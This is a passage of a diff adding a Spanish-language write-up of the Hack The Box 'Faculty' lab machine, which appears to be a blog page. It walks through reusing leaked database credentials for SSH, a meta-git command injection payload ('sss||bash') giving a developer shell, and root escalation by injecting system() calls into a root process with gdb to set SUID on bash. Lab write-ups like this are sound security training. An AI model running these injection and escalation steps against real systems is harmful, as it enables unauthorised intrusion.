+                <pre><code class="language-php">$conn = new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')</code></pre>
+                
+                <p>Esto revela credenciales de base de datos: <code>sched:Co.met06aci.dly53ro.per</code></p>
+                
+                <h2>Acceso SSH como gbyolo</h2>
+                <p>Probando la contraseña de la base de datos contra los usuarios descubiertos, encuentro que se reutiliza para acceso SSH:</p>
+                
+                <pre><code class="language-bash">ssh gbyolo@faculty.htb
+# Password: Co.met06aci.dly53ro.per</code></pre>
+                
+                <p>Obtengo exitosamente acceso SSH como <code>gbyolo</code> y recupero la flag de usuario.</p>
+                
+                <h3>Enumeración Post-Explotación</h3>
+                <p>Al iniciar sesión, noto una notificación de correo. Comprobando el correo revela:</p>
+                
+                <pre><code class="language-plaintext">Hi gbyolo, you can now manage git repositories belonging to the faculty group. 
+Please check and if you have troubles just let me know!
+\ndeveloper@faculty.htb</code></pre>
+                
+                <p>Esto sugiere que <code>gbyolo</code> tiene algunos privilegios relacionados con git. Comprobando los permisos de <code>sudo</code> confirma esto:</p>
+                
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <pre><code class="language-plaintext">Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gbyolo may run the following commands on faculty:
+    (developer) /usr/local/bin/meta-git</code></pre>
+                
+                <p>Puedo ejecutar <code>/usr/local/bin/meta-git</code> como usuario <code>developer</code>. Investigando este binario:</p>
+                
+                <pre><code class="language-bash">file /usr/local/bin/meta-git</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/local/bin/meta-git: symbolic link to ../lib/node_modules/meta-git/bin/meta-git</code></pre>
+                
+                <p>Es una librería de Node.js para gestionar repositorios git.</p>
+                
+                <h2>Escalada de Privilegios a Developer</h2>
+                <h3>Vulnerabilidad de Inyección de Comandos en meta-git</h3>
+                <p>Buscando vulnerabilidades en <code>meta-git</code>, encuentro un reporte de HackerOne (<a href="https://hackerone.com/reports/728040">https://hackerone.com/reports/728040</a>) detallando una vulnerabilidad de inyección de comandos en el comando <code>clone</code>. La vulnerabilidad permite ejecución arbitraria de comandos mediante caracteres especiales en el nombre del repositorio.</p>
+                
+                <p>La prueba de concepto es directa:</p>
+                
+                <pre><code class="language-bash">meta-git clone 'sss||touch HACKED'</code></pre>
+                
+                <p>Probando esto confirmo la vulnerabilidad. Para obtener una shell como <code>developer</code>, navego a <code>/tmp</code> (para evitar errores relacionados con directorios) y ejecuto:</p>
+                
+                <pre><code class="language-bash">cd /tmp
+sudo -u developer meta-git clone 'sss||bash'</code></pre>
+                
+                <pre><code class="language-plaintext">meta git cloning into 'sss||bash' at sss||bash
+sss||bash:
+fatal: repository 'sss' does not exist
+bash: sss: No such file or directory
+developer@faculty:/tmp$</code></pre>
+                
+                <p>A pesar de los mensajes de error, obtengo exitosamente una shell como <code>developer</code>:</p>
+                
+                <pre><code class="language-bash">id</code></pre>
+                
+                <pre><code class="language-plaintext">uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)</code></pre>
+                
+                <p>El usuario <code>developer</code> pertenece a tres grupos: <code>developer</code>, <code>debug</code> y <code>faculty</code>.</p>
+                
+                <h2>Escalada de Privilegios a Root</h2>
+                <h3>Investigando el Grupo debug</h3>
+                <p>Busco archivos y binarios accesibles al grupo <code>debug</code>:</p>
+                
+                <pre><code class="language-bash">find / -group debug 2>/dev/null</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/gdb</code></pre>
+                
+                <p>El binario del debugger <code>gdb</code> es propiedad de <code>root</code> pero ejecutable por el grupo <code>debug</code>:</p>
+                
+                <pre><code class="language-bash">ls -la /usr/bin/gdb</code></pre>
+                
+                <pre><code class="language-plaintext">-rwxr-x--- 1 root debug 8440200 Dec 8 2021 /usr/bin/gdb</code></pre>
+                
+                <p>Más importante, comprobando las capabilities de este binario revela un privilegio crítico:</p>
+                
+                <pre><code class="language-bash">getcap /usr/bin/gdb</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/gdb = cap_sys_ptrace+ep</code></pre>
+                
+                <h3>Entendiendo cap_sys_ptrace</h3>
+                <p>La capability <code>cap_sys_ptrace</code> permite a un proceso trazar y depurar cualquier proceso del sistema, incluyendo aquellos propiedad de root. Esto significa que puedo usar <code>gdb</code> para attacharme a un proceso propiedad de root e inyectar código arbitrario.</p>
+                
+                <h3>Encontrando un Proceso Objetivo Adecuado</h3>
+                <p>Necesito encontrar un proceso de root que pueda explotar de manera confiable. El objetivo ideal sería un proceso Python que ya haya importado el módulo <code>os</code>, permitiéndome ejecutar comandos del sistema. Busco tal proceso:</p>
+                
+                <pre><code class="language-bash">ps -faux | grep "^root" | grep python</code></pre>
+                
+                <pre><code class="language-plaintext">root  691  0.0  0.9  26896  18068  ?  Ss  00:11  0:00  /usr/bin/python3 /usr/bin/networkd-dispatcher 
+--run-startup-triggers</code></pre>
+                
+                <p>El servicio <code>networkd-dispatcher</code> se ejecuta como root con Python 3. Verificando que importa el módulo <code>os</code>:</p>
+                
+                <pre><code class="language-bash">head -20 /usr/bin/networkd-dispatcher</code></pre>
+                
+                <pre><code class="language-python">#!/usr/bin/python3
+# networkd-dispatcher
+(...)
+import os</code></pre>
+                
+                <p>¡Perfecto! Este proceso importa <code>os</code>, lo que significa que puedo usar <code>gdb</code> para llamar a la función <code>system()</code>.</p>
+                
+                <h3>Inyección de Proceso con GDB</h3>
+                <p>Me attacho con <code>gdb</code> al proceso objetivo (PID 691):</p>
+                
+                <pre><code class="language-bash">gdb -q -p 691</code></pre>
+                
+                <p>Dentro de <code>gdb</code>, ahora puedo llamar a funciones del sistema en el contexto del proceso propiedad de root. Primero, verifico la ejecución de comandos:</p>
+                
+                <pre><code class="language-gdb">(gdb) call (void)system("whoami > /tmp/test")</code></pre>
+                
+                <pre><code class="language-plaintext">[Detaching after vfork from child process 6305]</code></pre>
+                
+                <p>Comprobando el archivo de salida:</p>
+                
+                <pre><code class="language-bash">cat /tmp/test</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>¡Excelente! Los comandos se están ejecutando como root. Ahora puedo escalar a root estableciendo el bit SUID en <code>/bin/bash</code>:</p>
+                
+                <pre><code class="language-gdb">(gdb) call (void)system("chmod u+s /bin/bash")</code></pre>
+                
+                <p>Saliendo de <code>gdb</code> y spawneando una shell bash privilegiada:</p>
+                
+                <pre><code class="language-bash">bash -p</code></pre>
+                
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root para completar la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
